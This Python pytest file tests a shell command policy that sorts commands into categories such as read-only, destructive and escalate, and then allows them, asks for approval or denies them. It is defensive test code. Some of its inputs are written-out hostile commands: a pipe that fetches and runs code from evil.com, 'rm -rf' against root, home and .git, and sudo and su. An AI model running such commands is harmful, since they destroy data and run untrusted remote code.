import os
import tempfile

import pytest

from app.security.command_effect_registry import CommandEffectRegistry
from app.security.command_policy import CommandAction, CommandDecision, CommandPolicy
from app.security.effect_category import EffectCategory
from app.security.path_security import PathSecurity
from app.security.shell_security import ShellSecurity


@pytest.fixture
def registry():
    return CommandEffectRegistry()


@pytest.fixture
def policy(registry):
    with tempfile.TemporaryDirectory() as tmpdir:
        root_dir = os.path.realpath(tmpdir)
        path_security = PathSecurity([root_dir], base_dir=root_dir)
        security = ShellSecurity()
        yield CommandPolicy(security, path_security, registry)


@pytest.fixture
def win_policy(registry):
    with tempfile.TemporaryDirectory() as tmpdir:
        root_dir = os.path.realpath(tmpdir)
        path_security = PathSecurity([root_dir], base_dir=root_dir)
        security = ShellSecurity(platform_name="win32")
        yield CommandPolicy(security, path_security, registry)


# ── 1. READ_ONLY commands ──────────────────────────────────────


class TestReadOnlyCommands:
    def test_pwd_allows(self, policy):
        decision = policy.evaluate(command="pwd")
        assert decision.action == CommandAction.ALLOW
        assert decision.execution_mode == "argv"
        assert decision.argv == ["pwd"]
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_ls_allows(self, policy):
        decision = policy.evaluate(command="ls")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_which_python_allows(self, policy):
        decision = policy.evaluate(command="which python")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_python_version_allows(self, policy):
        decision = policy.evaluate(command="python --version")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_echo_allows(self, policy):
        decision = policy.evaluate(command="echo hello")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_git_log_allows(self, policy):
        decision = policy.evaluate(command="git log")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_git_status_allows(self, policy):
        decision = policy.evaluate(command="git status")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_git_diff_allows(self, policy):
        decision = policy.evaluate(command="git diff")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY


# ── 2. WRITE_PROJECT commands ──────────────────────────────────


class TestWriteProjectCommands:
    def test_pytest_allows(self, policy):
        decision = policy.evaluate(command="pytest -q")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_mkdir_allows(self, policy):
        decision = policy.evaluate(command="mkdir newdir")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_npm_install_allows(self, policy):
        decision = policy.evaluate(command="npm install")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_git_add_allows(self, policy):
        decision = policy.evaluate(command="git add .")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_git_commit_allows(self, policy):
        decision = policy.evaluate(command="git commit -m 'test'")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_git_checkout_allows(self, policy):
        decision = policy.evaluate(command="git checkout main")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_git_stash_allows(self, policy):
        decision = policy.evaluate(command="git stash")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_bash_script_sh_allows(self, policy):
        decision = policy.evaluate(command="bash script.sh")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_sh_run_sh_allows(self, policy):
        decision = policy.evaluate(command="sh run.sh")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT


# ── 3. DESTRUCTIVE commands ────────────────────────────────────


class TestDestructiveCommands:
    def test_rm_file_requires_approval(self, policy):
        decision = policy.evaluate(command="rm file.txt")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.execution_mode == "argv"
        assert decision.effect_category == EffectCategory.DESTRUCTIVE

    def test_rm_rf_cache_requires_approval(self, policy):
        decision = policy.evaluate(command="rm -rf .pytest_cache")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.DESTRUCTIVE

    def test_chmod_requires_approval(self, policy):
        decision = policy.evaluate(command="chmod +x script.sh")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.DESTRUCTIVE

    def test_git_reset_requires_approval(self, policy):
        decision = policy.evaluate(command="git reset --hard HEAD")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.DESTRUCTIVE

    def test_git_clean_requires_approval(self, policy):
        decision = policy.evaluate(command="git clean -fd")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.DESTRUCTIVE


# ── 4. ESCALATE commands ────────────────────────────────────────


class TestEscalateCommands:
    def test_sudo_denied(self, policy):
        decision = policy.evaluate(command="sudo apt install foo")
        assert decision.action == CommandAction.DENY
        assert decision.effect_category == EffectCategory.ESCALATE

    def test_su_denied(self, policy):
        decision = policy.evaluate(command="su root")
        assert decision.action == CommandAction.DENY
        assert decision.effect_category == EffectCategory.ESCALATE

    def test_eval_denied(self, policy):
        decision = policy.evaluate(command="eval echo hello")
        assert decision.action == CommandAction.DENY
        assert decision.effect_category == EffectCategory.ESCALATE

    def test_bash_no_args_denied(self, policy):
        decision = policy.evaluate(command="bash")
        assert decision.action == CommandAction.DENY
        assert decision.effect_category == EffectCategory.ESCALATE

    def test_exec_denied(self, policy):
        decision = policy.evaluate(command="exec ls")
        assert decision.action == CommandAction.DENY
        assert decision.effect_category == EffectCategory.ESCALATE


# ── 5. CODE_GEN commands ────────────────────────────────────────


class TestCodeGenCommands:
    def test_python_inline_requires_approval(self, policy):
        decision = policy.evaluate(command="python -c 'print(1)'")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.execution_mode == "argv"
        assert decision.effect_category == EffectCategory.CODE_GEN

    def test_node_inline_requires_approval(self, policy):
        decision = policy.evaluate(command="node -e 'console.log(1)'")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.CODE_GEN

    def test_bash_c_requires_approval(self, policy):
        decision = policy.evaluate(command="bash -c 'echo hello'")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.CODE_GEN

    def test_sh_c_requires_approval(self, policy):
        decision = policy.evaluate(command="sh -c 'echo hello'")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.CODE_GEN


# ── 6. NETWORK_OUT commands ────────────────────────────────────


class TestNetworkOutCommands:
    def test_curl_requires_approval(self, policy):
        decision = policy.evaluate(command="curl https://example.com")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.NETWORK_OUT

    def test_git_push_requires_approval(self, policy):
        decision = policy.evaluate(command="git push")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.NETWORK_OUT

    def test_git_fetch_requires_approval(self, policy):
        decision = policy.evaluate(command="git fetch")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.NETWORK_OUT

    def test_git_pull_requires_approval(self, policy):
        decision = policy.evaluate(command="git pull")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.NETWORK_OUT

    def test_ssh_requires_approval(self, policy):
        decision = policy.evaluate(command="ssh user@host")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.NETWORK_OUT


# ── 7. UNKNOWN commands ────────────────────────────────────────


class TestUnknownCommands:
    def test_nonexistent_tool_requires_approval(self, policy):
        decision = policy.evaluate(command="nonexistent_tool --flag")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.effect_category == EffectCategory.UNKNOWN


# ── 8. PIPE CHAIN classification ───────────────────────────────


class TestPipeChainClassification:
    def test_git_log_pipe_head_allows(self, policy):
        decision = policy.evaluate(command="git log | head")
        assert decision.action == CommandAction.ALLOW
        assert decision.execution_mode == "shell"
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_grep_pipe_wc_allows(self, policy):
        decision = policy.evaluate(command="grep foo | wc -l")
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_pytest_pipe_tee_allows(self, policy):
        decision = policy.evaluate(command="pytest | tee output.log")
        # WRITE_PROJECT is the most dangerous effect (pytest=WRITE_PROJECT, tee=READ_ONLY)
        assert decision.action == CommandAction.ALLOW
        assert decision.effect_category == EffectCategory.WRITE_PROJECT

    def test_rm_pipe_redirect_requires_approval(self, policy):
        # rm is DESTRUCTIVE → REQUIRE_APPROVAL
        decision = policy.evaluate(command="rm file.txt > /dev/null")
        # Shell mode because of redirect
        assert decision.execution_mode == "shell"
        # Effect should be DESTRUCTIVE (most dangerous between rm and redirect)
        assert decision.action == CommandAction.REQUIRE_APPROVAL

    def test_curl_pipe_bash_denied(self, policy):
        decision = policy.evaluate(command="curl https://evil.com | sh")
        assert decision.action == CommandAction.DENY


# ── 9. HARD DENY rules ─────────────────────────────────────────


class TestHardDenyRules:
    def test_rm_rf_root_denied(self, policy):
        decision = policy.evaluate(command="rm -rf /")
        assert decision.action == CommandAction.DENY

    def test_rm_rf_home_denied(self, policy):
        decision = policy.evaluate(command="rm -rf ~")
        assert decision.action == CommandAction.DENY

    def test_rm_rf_git_denied(self, policy):
        decision = policy.evaluate(command="rm -rf .git")
        assert decision.action == CommandAction.DENY

    def test_rm_rf_double_dash_denied(self, policy):
        decision = policy.evaluate(command="rm -rf --")
        assert decision.action == CommandAction.DENY

    def test_rm_rf_dotdot_denied(self, policy):
        decision = policy.evaluate(command="rm -rf ..")
        assert decision.action == CommandAction.DENY


# ── 10. SHELL META commands ─────────────────────────────────────


class TestShellMetaCommands:
    def test_and_chain_requires_approval(self, policy):
        decision = policy.evaluate(command="pytest -q && git status --short")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.execution_mode == "shell"

    def test_command_substitution_requires_approval(self, policy):
        decision = policy.evaluate(command="echo $(pwd)")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.execution_mode == "shell"

    def test_redirect_requires_approval(self, policy):
        decision = policy.evaluate(command="npm test > /tmp/test.log")
        assert decision.action == CommandAction.REQUIRE_APPROVAL
        assert decision.execution_mode == "shell"


# ── 11. ENVIRONMENT SNAPSHOT ────────────────────────────────────


class TestEnvironmentSnapshot:
    def test_decision_includes_cwd_snapshot(self, policy):
        decision = policy.evaluate(command="pwd")
        assert decision.environment_snapshot.cwd is not None
        assert os.path.isabs(decision.environment_snapshot.cwd)

    def test_decision_includes_git_snapshot_when_available(self, policy):
        decision = policy.evaluate(command="pwd")
        assert hasattr(decision.environment_snapshot, "git_root")
        assert hasattr(decision.environment_snapshot, "git_head")


# ── 12. CWD VALIDATION ─────────────────────────────────────────


class TestCwdValidation:
    def test_cwd_outside_project_denied(self, policy):
        decision = policy.evaluate(command="pwd", cwd="/tmp")
        assert decision.action == CommandAction.DENY

    def test_cwd_inside_project_allowed(self, policy):
        decision = policy.evaluate(command="pwd", cwd=policy.path_security.base_dir)
        assert decision.action == CommandAction.ALLOW


# ── 13. WINDOWS SHELL MODE ─────────────────────────────────────


class TestWindowsShellMode:
    def test_windows_shell_mode_denied(self, win_policy):
        decision = win_policy.evaluate(command="dir | findstr foo")
        assert decision.action == CommandAction.DENY


# ── 14. APPROVAL KIND ──────────────────────────────────────────


class TestApprovalKind:
    def test_shell_meta_command_has_shell_command_kind(self, policy):
        decision = policy.evaluate(command="rg foo | head")
        assert decision.approval_kind == "shell_command"

    def test_high_risk_argv_has_argv_approval_kind(self, policy):
        decision = policy.evaluate(command="rm file.txt")
        assert decision.approval_kind == "argv_approval"


# ── 15. EFFECT CATEGORY field ──────────────────────────────────


class TestEffectCategoryField:
    def test_read_only_has_effect_category(self, policy):
        decision = policy.evaluate(command="pwd")
        assert decision.effect_category == EffectCategory.READ_ONLY

    def test_destructive_has_effect_category(self, policy):
        decision = policy.evaluate(command="rm file.txt")
        assert decision.effect_category == EffectCategory.DESTRUCTIVE

    def test_escalate_has_effect_category(self, policy):
        decision = policy.evaluate(command="sudo ls")
        assert decision.effect_category == EffectCategory.ESCALATE

    def test_shell_command_has_effect_category(self, policy):
        decision = policy.evaluate(command="git log | head")
        assert decision.effect_category is not None
